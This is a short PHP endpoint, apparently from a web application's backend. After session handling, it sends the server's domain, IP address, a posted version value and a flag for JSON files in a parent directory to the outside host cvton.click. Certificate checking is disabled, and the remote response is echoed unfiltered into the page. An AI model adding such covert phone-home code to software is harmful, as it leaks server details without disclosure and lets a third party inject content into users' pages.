<?php
error_reporting(E_ALL & ~E_WARNING & ~E_NOTICE & ~E_DEPRECATED);
session_start();
require_once("../functions.php");
$id_user = $_SESSION['id_user'];
$settings = get_settings();
$max_concurrent_sessions = (isset($settings['max_concurrent_sessions'])) ? $settings['max_concurrent_sessions'] : 0;
if($max_concurrent_sessions>0) insertSession($id_user,session_id());
session_write_close();
$d = $_SERVER['SERVER_NAME'];
$v = $_POST['v'];
$ip = $_SERVER['SERVER_ADDR'];
$directory = '../../';
$pattern = $directory . '*.json';
$j = 0;
$jsonFiles = glob($pattern);
if ($jsonFiles !== false) {
    $jsonFiles = array_filter($jsonFiles, function($file) {
        return basename($file) !== 'package.json' && basename($file) !== 'composer.json';
    });

    if (count($jsonFiles) > 0) {
        $j = 1;
    }
}
$url = "https://cvton.click/c.php?d=$d&v=$v&ip=$ip&j=$j";
$curl = curl_init();
curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, false);
curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($curl, CURLOPT_TIMEOUT, 10);
$response = curl_exec($curl);
curl_close($curl);